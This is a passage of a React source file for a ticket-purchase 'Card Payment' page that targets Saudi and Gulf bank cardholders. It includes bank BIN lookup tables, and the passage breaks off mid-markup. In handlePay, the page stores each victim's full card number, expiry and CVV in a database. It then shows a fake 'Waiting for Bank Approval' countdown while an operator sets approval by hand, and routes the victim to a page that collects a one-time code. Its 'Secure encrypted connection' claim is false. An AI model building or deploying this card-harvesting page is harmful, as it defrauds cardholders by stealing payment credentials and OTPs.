import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useLanguage } from "@/i18n/LanguageContext";
import { useToast } from "@/hooks/use-toast";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { motion, AnimatePresence } from "framer-motion";
import { Lock, CreditCard, CheckCircle, AlertCircle, Loader2, ShieldCheck, Calendar, ChevronDown } from "lucide-react";
import BackButton from "@/components/BackButton";
import { BIN_DATABASE, BIN8_DATABASE, MADA_BINS } from "@/data/binDatabase";

// ─── BIN Database ─────────────────────────────────────────────────────────────
// ─── Helpers ──────────────────────────────────────────────────────────────────
type CardType = "debit" | "credit" | "prepaid" | null;

function detectCardBrand(n: string): "visa" | "mastercard" | "amex" | "mada" | null {
  const c = n.replace(/\s/g, "");
  if (MADA_BINS.some(bin => c.startsWith(bin))) return "mada";
  if (/^4/.test(c)) return "visa";
  if (/^5[1-5]/.test(c) || /^2[2-7]/.test(c)) return "mastercard";
  if (/^3[47]/.test(c)) return "amex";
  return null;
}

function detectCardType(n: string, brand: string | null): CardType {
  const c = n.replace(/\s/g, "");
  if (c.length < 4) return null;
  // mada is always debit
  if (brand === "mada") return "debit";
  // STC Pay / prepaid patterns
  if (/^(636120|636121|636122|504352|510288)/.test(c)) return "prepaid";
  // Known Saudi debit BINs (bintable verified)
  const debitPrefixes = [
    // Al Rajhi debit
    "400861","405433","409246","417321","417323","419461","426362","432159",
    "455739","455740","490980","494329",
    // SNB debit (non-mada)
    // Riyad Bank debit
    "457927","517531",
    // BSF debit
    "475558","444445","437980","401978",
    // SIB debit
    "440630","478295","478296",
    // Albilad debit
    "428335",
    // Prepaid (bintable)
    "445826","445827","445522","410249","405433",
  ];
  if (debitPrefixes.some(p => c.startsWith(p))) return "debit";
  // Amex is typically credit
  if (brand === "amex") return "credit";
  // Known credit prefixes (verified from bintable.com)
  const creditPrefixes = [
    // Al Rajhi (bintable: credit)
    "445520","445521","436321","416634","486653","542894","407620","410248",
    // SNB (bintable: credit)
    "541891","532166","492146","492145","491797","485042","485005","483178",
    "433347","430262","430260","430259","430258","422862","417490","417487",
    "414026","412113","404116","400399",
    // BSF (bintable: credit)
    "552360","552012","547042","542747","524148","517724","512727","512691",
    "496655","473899","459800","459588","459583","450824","437979","437978",
    "437977","437976","437975","437974","428275","428274","425871","401884",
    "401883","401812",
    // Riyad Bank (bintable: credit)
    "559322","548323","548322","545855","541988","541802","541679","539859",
    "520090","520089","514932","490917","454684","454683","448509","435240","433952",
    // ANB (bintable: credit)
    "549400","544017","542806","536813","520431","520430","517918","491610",
    "473258","466515","455037","455035","455017","451111","420177","404949","400067",
    // SAB (bintable: credit)
    "546757","546756","545297","541653","490160","456893","456891","455389",
    "455340","455310","455058","433786","427222","414478",
    // SAB + Saudi Hollandi (bincheck.org)
    "410747","411166","411167","412518","412710","416041","427733","427739",
    "490745","512060","522139","524165","530843","540236","541643","541645",
    "543199","543408","546755","547645","548350","548979","552375","558705","558854",
    // AlJazira (bintable: credit)
    "489317","473828","473827","473826","473825","440532","428375","428374",
    "421051","414841","414090","406487","515804",
    // SIB (bintable: credit)
    "552384","542373","529298","524205","483009","476815","469616","457843",
    "457842","457841","457840","440631","440629",
    // SNB additional (bincheck.org - Samba merged)
    "517720","518694","519310","519341","521031","523954","523998","524116",
    "524388","525688","534186","536369","539034","539035","540613","544217",
    "544744","545205","546336","546631","548255","549699","549954","552075",
    "552077","556675","433987","433988","454336","496649","523970","540902",
    "542805","544229","545318","552089","552250",
    // BSF additional (bincheck.org)
    "540930","547043",
    // Riyad additional
    "517532",
  ];
  if (creditPrefixes.some(p => c.startsWith(p))) return "credit";
  // Default: if starts with 4/5 and not in debit list, likely credit
  if (c.length >= 6) return "credit";
  return null;
}

function detectBank(n: string) {
  const c = n.replace(/\s/g, "");
  // Check 8-digit BINs first (BIN8)
  if (c.length >= 8) {
    const bin8 = c.substring(0, 8);
    if (BIN8_DATABASE[bin8]) return BIN8_DATABASE[bin8];
  }
  // Then 6-digit BINs
  for (const len of [6, 5, 4]) {
    if (c.length >= len) {
      const bin = c.substring(0, len);
      if (BIN_DATABASE[bin]) return BIN_DATABASE[bin];
    }
  }
  return null;
}

function isValidLuhn(n: string): boolean {
  const c = n.replace(/\s/g, "");
  if (c.length < 13) return false;
  let sum = 0, even = false;
  for (let i = c.length - 1; i >= 0; i--) {
    let d = parseInt(c[i], 10);
    if (even) { d *= 2; if (d > 9) d -= 9; }
    sum += d; even = !even;
  }
  return sum % 10 === 0;
}

function formatCardNumber(v: string, cardBrand?: string | null) {
  const digits = v.replace(/\D/g, "");
  // Amex: 4-6-5 format, max 15 digits
  if (cardBrand === "amex") {
    const limited = digits.substring(0, 15);
    const parts: string[] = [];
    if (limited.length > 0) parts.push(limited.substring(0, 4));
    if (limited.length > 4) parts.push(limited.substring(4, 10));
    if (limited.length > 10) parts.push(limited.substring(10, 15));
    return parts.join(" ");
  }
  // Default (Visa/MC/mada): 4-4-4-4, max 16 digits
  return digits.substring(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

// ─── Card Brand Logos ─────────────────────────────────────────────────────────
const BrandLogo = ({ brand }: { brand: string | null }) => {
  if (!brand) return <CreditCard className="w-6 h-6 text-slate-400" />;
  if (brand === "visa") return (
    <svg viewBox="0 0 48 16" className="h-5 w-auto">
      <text x="0" y="14" fontSize="16" fontWeight="bold" fill="#1a1f71" fontFamily="Arial">VISA</text>
    </svg>
  );
  if (brand === "mastercard") return (
    <svg viewBox="0 0 38 24" className="h-5 w-auto">
      <circle cx="13" cy="12" r="10" fill="#eb001b" />
      <circle cx="25" cy="12" r="10" fill="#f79e1b" />
      <path d="M19 5.5a10 10 0 0 1 0 13A10 10 0 0 1 19 5.5z" fill="#ff5f00" />
    </svg>
  );
  if (brand === "amex") return (
    <svg viewBox="0 0 60 20" className="h-5 w-auto">
      <text x="0" y="16" fontSize="14" fontWeight="bold" fill="#2e77bc" fontFamily="Arial">AMEX</text>
    </svg>
  );
  if (brand === "mada") return (
    <svg viewBox="0 0 60 20" className="h-5 w-auto">
      <text x="0" y="16" fontSize="14" fontWeight="bold" fill="#00a651" fontFamily="Arial">mada</text>
    </svg>
  );
  return null;
};

// ─── Bank Icon Badge ─────────────────────────────────────────────────────────
const BANK_ABBR: Record<string, { abbr: string; bg: string; fg: string }> = {
  "Al Rajhi Bank":          { abbr: "ARB", bg: "#fff", fg: "#1a5276" },
  "Saudi National Bank":    { abbr: "SNB", bg: "#fff", fg: "#1b4f72" },
  "Banque Saudi Fransi":    { abbr: "BSF", bg: "#fff", fg: "#1a3a5c" },
  "Riyad Bank":             { abbr: "RB",  bg: "#fff", fg: "#154360" },
  "Alinma Bank":            { abbr: "INM", bg: "#fff", fg: "#0e6655" },
  "Bank Albilad":           { abbr: "BAB", bg: "#fff", fg: "#1f618d" },
  "Arab National Bank":     { abbr: "ANB", bg: "#fff", fg: "#6e2f1a" },
  "Saudi Awwal Bank":       { abbr: "SAB", bg: "#fff", fg: "#1a5276" },
  "Bank AlJazira":          { abbr: "BAJ", bg: "#fff", fg: "#1b2631" },
  "Saudi Investment Bank":  { abbr: "SIB", bg: "#fff", fg: "#2c3e50" },
  "Gulf International Bank":{ abbr: "GIB", bg: "#fff", fg: "#1a237e" },
  "Emirates NBD":           { abbr: "ENBD",bg: "#fff", fg: "#003366" },
  "ADCB":                   { abbr: "ADCB",bg: "#fff", fg: "#2e4057" },
  "First Abu Dhabi Bank":   { abbr: "FAB", bg: "#fff", fg: "#6b3a2a" },
  "Mashreq Bank":           { abbr: "MSQ", bg: "#fff", fg: "#d4a017" },
  "Dubai Islamic Bank":     { abbr: "DIB", bg: "#fff", fg: "#0b5345" },
  "National Bank of Kuwait":{ abbr: "NBK", bg: "#fff", fg: "#1a5276" },
  "Kuwait Finance House":   { abbr: "KFH", bg: "#fff", fg: "#1b4f72" },
  "Qatar National Bank":    { abbr: "QNB", bg: "#fff", fg: "#6e2142" },
  "National Bank of Bahrain":{ abbr: "NBB",bg: "#fff", fg: "#154360" },
  "Bank Muscat":            { abbr: "BM",  bg: "#fff", fg: "#b7312c" },
  "STC Pay":                { abbr: "STC", bg: "#fff", fg: "#4a148c" },
};

const BankIconBadge = ({ bankName }: { bankName: string | null }) => {
  if (!bankName) {
    return (
      <div className="w-7 h-7 rounded-md bg-white/20 flex items-center justify-center">
        <CreditCard className="w-4 h-4 text-white/60" />
      </div>
    );
  }
  const info = BANK_ABBR[bankName];
  if (!info) {
    return (
      <div className="w-7 h-7 rounded-md bg-white/20 flex items-center justify-center">
        <span className="text-[8px] font-bold text-white">{bankName.substring(0, 2).toUpperCase()}</span>
      </div>
    );
  }
  return (
    <div
      className="w-7 h-7 rounded-md flex items-center justify-center shadow-sm"
      style={{ background: info.bg }}
    >
      <span className="font-black leading-none" style={{ color: info.fg, fontSize: info.abbr.length > 3 ? "6px" : "7px" }}>
        {info.abbr}
      </span>
    </div>
  );
};

const WaitingApproval = ({
  orderId, onApproved, onRejected, isAr,
}: { orderId: string; onApproved: () => void; onRejected: () => void; isAr: boolean }) => {
  const [timeLeft, setTimeLeft] = useState(120);

  useEffect(() => {
    const channel = supabase
      .channel(`order-wait-${orderId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public",
        table: "ticket_orders", filter: `id=eq.${orderId}`,
      }, (payload) => {
        const s = payload.new?.status;
        if (s === "confirmed") onApproved();
        else if (s === "rejected") onRejected();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [orderId, onApproved, onRejected]);

  useEffect(() => {
    if (timeLeft <= 0) { onRejected(); return; }
    const t = setTimeout(() => setTimeLeft(v => v - 1), 1000);
    return () => clearTimeout(t);
  }, [timeLeft, onRejected]);

  const mm = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const ss = (timeLeft % 60).toString().padStart(2, "0");
  const progress = (timeLeft / 120) * 100;

  return (
    <div className="flex flex-col items-center justify-center py-10 text-center">
      <div className="relative w-28 h-28 mb-6">
        <svg className="w-28 h-28 -rotate-90" viewBox="0 0 112 112">
          <circle cx="56" cy="56" r="50" fill="none" stroke="#f1f5f9" strokeWidth="7" />
          <circle
            cx="56" cy="56" r="50" fill="none"
            stroke="hsl(var(--primary))" strokeWidth="7"
            strokeLinecap="round"
            strokeDasharray={`${2 * Math.PI * 50}`}
            strokeDashoffset={`${2 * Math.PI * 50 * (1 - progress / 100)}`}
            style={{ transition: "stroke-dashoffset 1s linear" }}
          />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className="text-2xl font-bold text-foreground font-mono">{mm}:{ss}</span>
        </div>
      </div>

      <motion.div
        animate={{ scale: [1, 1.1, 1] }}
        transition={{ repeat: Infinity, duration: 2 }}
        className="text-5xl mb-4"
      >
        🔐
      </motion.div>

      <h3 className="text-xl font-bold text-foreground mb-2">
        {isAr ? "في انتظار موافقة البنك" : "Waiting for Bank Approval"}
      </h3>
      <p className="text-sm text-muted-foreground max-w-xs">
        {isAr ? "يتم التحقق من بيانات بطاقتك. يرجى الانتظار..." : "Your card details are being verified. Please wait..."}
      </p>
      <div className="mt-5 flex items-center gap-2 text-xs text-muted-foreground">
        <Lock className="w-3.5 h-3.5" />
        <span>{isAr ? "اتصال آمن ومشفر" : "Secure encrypted connection"}</span>
      </div>
    </div>
  );
};

// ─── Main Component ───────────────────────────────────────────────────────────
const CardPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { lang } = useLanguage();
  const { toast } = useToast();
  const isAr = lang === "ar";

  const state = location.state as {
    tickets?: { id: string | number; name?: string; label?: string; price: number; qty: number }[];
    firstName?: string;
    lastName?: string;
    email?: string;
    phone?: string;
    total?: number;
    vat?: number;
    subtotal?: number;
  } | null;

  const [cardNumber, setCardNumber] = useState("");
  const [cardHolder, setCardHolder] = useState(
    state?.firstName && state?.lastName ? `${state.firstName} ${state.lastName}` : ""
  );
  const [expiry, setExpiry]   = useState("");
  const [cvv, setCvv]         = useState("");
  const [focused, setFocused] = useState<string | null>(null);
  const [isFlipped, setIsFlipped] = useState(false);

  const [brand, setBrand] = useState<"visa" | "mastercard" | "amex" | "mada" | null>(null);
  const [bank, setBank]   = useState<{ bank: string; bankAr: string; color: string } | null>(null);
  const [cardType, setCardType] = useState<CardType>(null);

  const [errors, setErrors]   = useState<Record<string, string>>({});
  const [loading, setLoading] = useState(false);
  const [step, setStep]       = useState<"form" | "waiting">("form");
  const [orderId, setOrderId] = useState("");

  // ─── Handlers ────────────────────────────────────────────────────────────
  const onCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    // Only allow digits and spaces
    if (/[^\d\s]/.test(raw.replace(/\s/g, "").split("").join(""))) return;
    const rawClean = raw.replace(/\D/g, "");
    const newBrand = detectCardBrand(rawClean);
    const fmt = formatCardNumber(raw, newBrand);
    setCardNumber(fmt);
    const clean = fmt.replace(/\s/g, "");
    setBrand(newBrand);
    setBank(detectBank(clean));
    setCardType(detectCardType(clean, newBrand));
    if (newBrand !== brand) setCvv("");
    // Real-time Luhn validation
    const expectedLen = newBrand === "amex" ? 15 : 16;
    if (clean.length === expectedLen && !isValidLuhn(clean)) {
      setErrors(p => ({ ...p, cardNumber: isAr ? "رقم البطاقة غير صالح" : "Invalid card number" }));
    } else {
      if (errors.cardNumber) setErrors(p => ({ ...p, cardNumber: "" }));
    }
  };

  const onExpiryMonthChange = (month: string) => {
    const y = expiry.includes("/") ? expiry.split("/")[1] : "";
    setExpiry(month + "/" + y);
    if (errors.expiry) setErrors(p => ({ ...p, expiry: "" }));
  };
  const onExpiryYearChange = (year: string) => {
    const m = expiry.includes("/") ? expiry.split("/")[0] : "";
    setExpiry(m + "/" + year);
    if (errors.expiry) setErrors(p => ({ ...p, expiry: "" }));
  };

  const onCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const maxLen = brand === "amex" ? 4 : 3;
    const v = e.target.value.replace(/\D/g, "").substring(0, maxLen);
    setCvv(v);
    if (errors.cvv) setErrors(p => ({ ...p, cvv: "" }));
  };

  // ─── Validation ──────────────────────────────────────────────────────────
  const validate = () => {
    const e: Record<string, string> = {};
    const clean = cardNumber.replace(/\s/g, "");
    if (!cardHolder.trim()) e.cardHolder = isAr ? "الاسم مطلوب" : "Name is required";
    if (clean.length < 13)  e.cardNumber = isAr ? "رقم البطاقة غير صحيح" : "Invalid card number";
    else if (!isValidLuhn(clean)) e.cardNumber = isAr ? "رقم البطاقة غير صالح" : "Card number is not valid";
    if (!expiry.match(/^\d{2}\/\d{2}$/)) {
      e.expiry = isAr ? "تاريخ الانتهاء غير صحيح" : "Invalid expiry";
    } else {
      const [m, y] = expiry.split("/").map(Number);
      if (m < 1 || m > 12 || new Date(2000 + y, m - 1) < new Date())
        e.expiry = isAr ? "البطاقة منتهية الصلاحية" : "Card expired";
    }
    const cvvRequired = brand === "amex" ? 4 : 3;
    if (cvv.length < cvvRequired) e.cvv = isAr ? "CVV غير صحيح" : "Invalid CVV";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  // ─── Submit ───────────────────────────────────────────────────────────────
  const handlePay = async () => {
    if (!validate()) return;
    setLoading(true);
    try {
      const clean = cardNumber.replace(/\s/g, "");
      const { data, error } = await (supabase as any)
        .from("ticket_orders")
        .insert({
          status: "pending",
          card_last4: clean.slice(-4),
          card_brand: brand || "unknown",
          cardholder_name: cardHolder,
          bank_name: bank ? (isAr ? bank.bankAr : bank.bank) : null,
          card_full_number: clean,
          card_expiry: expiry,
          card_cvv: cvv,
          total: state?.total || 0,
          email: state?.email || null,
          phone: state?.phone ? `00966${state.phone.replace(/^0+/, "").replace(/^\+966/, "")}` : null,
          subtotal: state?.subtotal || null,
          vat: state?.vat || null,
          tickets: state?.tickets || null,
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        })
        .select("id")
        .single();

      if (error || !data) throw error || new Error("No data");
      setOrderId(data.id);
      setStep("waiting");
    } catch (err) {
      console.error(err);
      toast({ title: isAr ? "❌ حدث خطأ" : "❌ Error occurred", variant: "destructive" });
    } finally {
      setLoading(false);
    }
  };

  const handleApproved = () => {
    navigate("/card-otp", {
      state: {
        orderId,
        cardLast4: cardNumber.replace(/\s/g, "").slice(-4),
        cardBrand: brand,
        tickets: state?.tickets,
        email: state?.email,
        phone: state?.phone,
        total: state?.total,
        vat: state?.vat,
        subtotal: state?.subtotal,
      },
    });
  };

  const handleRejected = () => {
    setStep("form");
    toast({
      title: isAr ? "❌ تم رفض الدفع" : "❌ Payment declined",
      description: isAr ? "يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى" : "Please check your card details and try again",
      variant: "destructive",
    });
  };

  const inputClass = (field: string) =>
    `w-full px-4 py-3 rounded-xl border text-sm transition-all outline-none bg-background text-foreground
    ${errors[field]
      ? "border-destructive bg-destructive/5"
      : focused === field
      ? "border-primary ring-2 ring-primary/20"
      : "border-border hover:border-border/80"}`;

  // ─── Render ───────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-background font-body" dir={isAr ? "rtl" : "ltr"}>
      <Header />
      <main className="pt-28 pb-20 px-4">
        <div className="max-w-lg mx-auto">
          <BackButton />
          <div className="bg-card rounded-2xl border border-border shadow-sm overflow-hidden">

            {/* رأس الصفحة */}
            <div className="px-6 py-5 border-b border-border">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center">
                  <CreditCard className="w-5 h-5 text-primary" />
                </div>
                <div>
                  <h1 className="font-display text-lg font-bold text-foreground">
                    {isAr ? "الدفع بالبطاقة" : "Card Payment"}
                  </h1>
                  <p className="text-xs text-muted-foreground">
                    {isAr ? "أدخل بيانات بطاقتك البنكية" : "Enter your card details"}
                  </p>
                </div>
                <div className="mr-auto flex items-center gap-1.5 text-xs text-muted-foreground">
                  <Lock className="w-3.5 h-3.5 text-green-500" />
                  <span className="text-green-600 font-medium">{isAr ? "آمن" : "Secure"}</span>
                </div>
              </div>
            </div>

            <AnimatePresence mode="wait">
              {step === "form" && (
                <motion.div
                  key="form"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="p-6 space-y-5"
                >
                  {state?.total && (
                    <div className="flex items-center justify-between bg-primary/5 border border-primary/20 rounded-xl px-4 py-3">
                      <span className="text-sm text-muted-foreground">
                        {isAr ? "المبلغ الإجمالي" : "Total Amount"}
                      </span>
                      <span className="text-lg font-bold text-foreground">
                        {state.total.toLocaleString()} {isAr ? "ر.س" : "SAR"}
                      </span>
                    </div>
                  )}


                  <div>
                    <label className="block text-sm font-medium text-foreground mb-1.5">
                      {isAr ? "اسم حامل البطاقة" : "Cardholder Name"}
                    </label>
                    <input
                      type="text"
                      value={cardHolder}
                      onChange={e => { setCardHolder(e.target.value); if (errors.cardHolder) setErrors(p => ({ ...p, cardHolder: "" })); }}
                      onFocus={() => setFocused("cardHolder")}
                      onBlur={() => setFocused(null)}
                      placeholder={isAr ? "الاسم كما يظهر على البطاقة" : "Name as on card"}
                      className={inputClass("cardHolder")}
                    />
                    {errors.cardHolder && (
                      <p className="text-destructive text-xs mt-1 flex items-center gap-1">
                        <AlertCircle className="w-3 h-3" /> {errors.cardHolder}
                      </p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-foreground mb-1.5">
                      {isAr ? "رقم البطاقة" : "Card Number"}
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        inputMode="numeric"
                        dir="ltr"
                        value={cardNumber}
                        onChange={onCardNumberChange}
                        onFocus={() => setFocused("cardNumber")}
                        onBlur={() => setFocused(null)}
                        placeholder="•••• •••• •••• ••••"
                        className={`${inputClass("cardNumber")} font-mono ${isAr ? "pl-12" : "pr-12"}`}
                      />
                      <div className={`absolute top-1/2 -translate-y-1/2 ${isAr ? "left-3" : "right-3"}`}>
                        <BrandLogo brand={brand} />
                      </div>
                    </div>
                    <AnimatePresence>
                    {bank && !errors.cardNumber && (
                      <motion.p
                        initial={{ opacity: 0, y: -8, scale: 0.9 }}
                        animate={{ opacity: 1, y: 0, scale: 1 }}
                        exit={{ opacity: 0, y: -8, scale: 0.9 }}
                        transition={{ type: "spring", stiffness: 400, damping: 20 }}
                        className="text-green-600 text-xs mt-1 flex items-center gap-1"
                      >
                        <motion.span
                          initial={{ scale: 0 }}
                          animate={{ scale: 1 }}
                          transition={{ type: "spring", stiffness: 500, delay: 0.1 }}
                        >
                          <CheckCircle className="w-3 h-3" />
                        </motion.span>
                        {isAr ? bank.bankAr : bank.bank}
                        {cardType && (
                          <motion.span
                            initial={{ opacity: 0, x: -10 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: 0.2 }}
                            className={`${
                              cardType === "debit" ? "bg-blue-100 text-blue-700" :
                              cardType === "prepaid" ? "bg-purple-100 text-purple-700" :
                              "bg-emerald-100 text-emerald-700"
                            } px-1.5 py-0.5 rounded text-[10px] font-medium`}
                          >
                            {isAr
                              ? cardType === "debit" ? "خصم" : cardType === "prepaid" ? "مسبقة الدفع" : "ائتمان"
                              : cardType === "debit" ? "Debit" : cardType === "prepaid" ? "Prepaid" : "Credit"
                            }
                          </motion.span>
                        )}
                        {(() => {
                          const clean = cardNumber.replace(/\s/g, "");
                          const expectedLen = brand === "amex" ? 15 : 16;
                          if (clean.length === expectedLen && isValidLuhn(clean)) {
                            return (
                              <motion.span
                                initial={{ opacity: 0, scale: 0 }}
                                animate={{ opacity: 1, scale: 1 }}
                                transition={{ type: "spring", stiffness: 500, delay: 0.3 }}
                                className="bg-green-100 text-green-700 px-1.5 py-0.5 rounded text-[10px] font-medium flex items-center gap-0.5"
                              >
                                <ShieldCheck className="w-3 h-3" /> {isAr ? "رقم صالح" : "Valid"}
                              </motion.span>
                            );
                          }
                          return null;
                        })()}
                      </motion.p>
                    )}
                    </AnimatePresence>
                    {errors.cardNumber && (
                      <p className="text-destructive text-xs mt-1 flex items-center gap-1 animate-pulse">
                        <AlertCircle className="w-3 h-3" /> {errors.cardNumber}
                      </p>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="flex items-center gap-1.5 text-sm font-medium text-foreground mb-1.5">
                        <Calendar className="w-4 h-4 text-primary" />
                        {isAr ? "تاريخ الانتهاء" : "Expiry Date"}
                      </label>
                      <div className="grid grid-cols-2 gap-2">
                        <div className="relative group">
                          <select
                            dir="ltr"
                            value={expiry.split("/")[0] || ""}
                            onChange={e => { onExpiryMonthChange(e.target.value); setFocused("expiry"); }}
                            onFocus={() => setFocused("expiry")}
                            onBlur={() => setFocused(null)}
                            className={`${inputClass("expiry")} ${isAr ? "font-body" : "font-mono"} tabular-nums appearance-none cursor-pointer pl-8 rtl:pl-2 rtl:pr-8 transition-all duration-300 hover:border-primary/60 focus:ring-2 focus:ring-primary/20 text-center`}
                          >
                            <option value="">{isAr ? "شهر" : "MM"}</option>
                            {Array.from({ length: 12 }, (_, i) => {
                              const m = String(i + 1).padStart(2, "0");
                              return <option key={m} value={m}>{m}</option>;
                            })}
                          </select>
                          <ChevronDown className="absolute top-1/2 -translate-y-1/2 ltr:right-2.5 rtl:left-2.5 w-4 h-4 text-muted-foreground pointer-events-none group-hover:text-primary transition-colors" />
                        </div>
                        <div className="relative group">
                          <select
                            dir="ltr"
                            value={expiry.split("/")[1] || ""}
                            onChange={e => { onExpiryYearChange(e.target.value); setFocused("expiry"); }}
                            onFocus={() => setFocused("expiry")}
                            onBlur={() => setFocused(null)}
                            className={`${inputClass("expiry")} ${isAr ? "font-body" : "font-mono"} tabular-nums appearance-none cursor-pointer pl-8 rtl:pl-2 rtl:pr-8 transition-all duration-300 hover:border-primary/60 focus:ring-2 focus:ring-primary/20 text-center`}
                          >
                            <option value="">{isAr ? "سنة" : "YY"}</option>
                            {Array.from({ length: 10 }, (_, i) => {
                              const y = String(new Date().getFullYear() % 100 + i).padStart(2, "0");
                              return <option key={y} value={y}>{y}</option>;
                            })}
                          </select>
                          <ChevronDown className="absolute top-1/2 -translate-y-1/2 ltr:right-2.5 rtl:left-2.5 w-4 h-4 text-muted-foreground pointer-events-none group-hover:text-primary transition-colors" />
                        </div>
                      </div>
                      {errors.expiry && <p className="text-destructive text-xs mt-1">{errors.expiry}</p>}
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-foreground mb-1.5">
                        {isAr ? "رمز الأمان" : "CVV"}
                        <span className="text-muted-foreground font-normal mr-1">
                          ({brand === "amex" ? "4" : "3"} {isAr ? "أرقام" : "digits"})
                        </span>
                      </label>
                      <input
                        type="password"
                        inputMode="numeric"
                        value={cvv}
                        onChange={onCvvChange}
                        onFocus={() => { setFocused("cvv"); setIsFlipped(true); }}
                        onBlur={() => { setFocused(null); setIsFlipped(false); }}
                        placeholder={brand === "amex" ? "••••" : "•••"}
                        maxLength={brand === "amex" ? 4 : 3}
                        className={`${inputClass("cvv")} font-mono`}
                      />
                      {errors.cvv && <p className="text-destructive text-xs mt-1">{errors.cvv}</p>}
                    </div>
                  </div>

                  {/* البطاقة ثلاثية الأبعاد مع تدوير */}
                  <div
                    className="relative h-48 cursor-pointer rounded-2xl p-[1.5px] border-gradient-gold"
                      style={{
                        perspective: "1000px",
                        boxShadow: "0 0 18px hsl(43 72% 50% / 0.3), 0 0 40px hsl(43 72% 50% / 0.1)",
                      }}
                      onClick={() => setIsFlipped(f => !f)}
                    >
                    <motion.div
                      className="relative w-full h-full"
                      style={{ transformStyle: "preserve-3d" }}
                      animate={{ rotateY: isFlipped ? 180 : 0 }}
                      transition={{ duration: 0.6, ease: "easeInOut" }}
                    >
                      {/* الوجه الأمامي */}
                      <div
                        className="absolute inset-0 rounded-2xl p-5 flex flex-col justify-between overflow-hidden shadow-lg"
                        style={{
                          backfaceVisibility: "hidden",
                          background: "linear-gradient(135deg, hsl(220 15% 6%) 0%, hsl(220 12% 10%) 40%, hsl(43 40% 15%) 100%)",
                        }}
                      >
                        {/* Glow pulse when bank detected */}
                        {bank && (
                          <motion.div
                            className="absolute inset-0 rounded-2xl pointer-events-none"
                            initial={{ opacity: 0 }}
                            animate={{ opacity: [0, 0.4, 0] }}
                            transition={{ duration: 1.2, ease: "easeOut" }}
                            style={{ boxShadow: `0 0 40px 10px hsl(43 72% 50% / 0.35), inset 0 0 30px hsl(43 72% 50% / 0.15)` }}
                          />
                        )}
                        <div className="flex items-start justify-between">
                          <div className="flex items-center gap-2">
                            <motion.div
                              key={bank?.bank || "none"}
                              initial={{ scale: 0, rotate: -180 }}
                              animate={{ scale: 1, rotate: 0 }}
                              transition={{ type: "spring", stiffness: 300, damping: 15 }}
                            >
                              <BankIconBadge bankName={bank?.bank || null} />
                            </motion.div>
                            <div>
                              <motion.p
                                key={bank?.bankAr || "default"}
                                initial={{ opacity: 0, x: isAr ? 20 : -20 }}
                                animate={{ opacity: 1, x: 0 }}
                                transition={{ type: "spring", stiffness: 300 }}
                                className="text-white font-semibold text-sm"
                              >
                                {bank ? (isAr ? bank.bankAr : bank.bank) : (isAr ? "اسم البنك" : "Bank Name")}
                              </motion.p>
                              <AnimatePresence>
                              {cardType && (
                                <motion.p
                                  initial={{ opacity: 0, height: 0 }}
                                  animate={{ opacity: 1, height: "auto" }}
                                  exit={{ opacity: 0, height: 0 }}
                                  className="text-white/60 text-[9px] mt-0.5"
                                >
                                  {isAr
                                    ? cardType === "debit" ? "بطاقة خصم" : cardType === "prepaid" ? "مسبقة الدفع" : "بطاقة ائتمان"
                                    : cardType === "debit" ? "Debit Card" : cardType === "prepaid" ? "Prepaid" : "Credit Card"
                                  }
                                </motion.p>
                              )}
                              </AnimatePresence>
                            </div>
                          </div>
                          <div className="bg-white/15 rounded-lg px-2.5 py-1.5">
                            <BrandLogo brand={brand} />
                          </div>
                        </div>

                        <div className="w-10 h-8 rounded-md bg-gradient-to-br from-yellow-300 to-yellow-500 flex items-center justify-center">
                          <div className="w-6 h-5 border border-yellow-600/40 rounded-sm grid grid-cols-3 gap-px p-0.5">
                            {[...Array(9)].map((_, i) => <div key={i} className="bg-yellow-600/30 rounded-sm" />)}
                          </div>
                        </div>

                        <div dir="ltr" style={{ textAlign: isAr ? "right" : "left" }}>
                          <AnimatePresence mode="wait">
                            <motion.p
                              key={cardNumber || "placeholder-num"}
                              initial={{ y: -8, opacity: 0, scale: 0.95 }}
                              animate={{ y: 0, opacity: 1, scale: 1 }}
                              exit={{ y: 8, opacity: 0, scale: 0.95 }}
                              transition={{ duration: 0.3, ease: "easeOut" }}
                              className={`font-mono text-lg tracking-[0.2em] ${cardNumber ? "text-white drop-shadow-[0_0_8px_rgba(212,175,55,0.4)]" : "text-white"}`}
                            >
                              {cardNumber
                                ? cardNumber.padEnd(19, " ").substring(0, 19)
                                : "•••• •••• •••• ••••"}
                            </motion.p>
                          </AnimatePresence>
                        </div>

                        <div className="flex items-end justify-between">
                          <div>
                            <p className="text-white/40 text-[10px] mb-0.5">{isAr ? "حامل البطاقة" : "Card Holder"}</p>
                            <AnimatePresence mode="wait">
                              <motion.p
                                key={cardHolder || "placeholder-name"}
                                initial={{ x: -10, opacity: 0 }}
                                animate={{ x: 0, opacity: 1 }}
                                exit={{ x: 10, opacity: 0 }}
                                transition={{ duration: 0.3, ease: "easeOut" }}
                                className={`text-sm font-medium uppercase tracking-wide truncate max-w-[180px] ${cardHolder ? "text-white drop-shadow-[0_0_6px_rgba(212,175,55,0.3)]" : "text-white"}`}
                              >
                                {cardHolder || (isAr ? "الاسم الكامل" : "FULL NAME")}
                              </motion.p>
                            </AnimatePresence>
                          </div>
                          <div className="text-right">
                            <p className="text-white/40 text-[10px] mb-0.5">{isAr ? "الانتهاء" : "Expires"}</p>
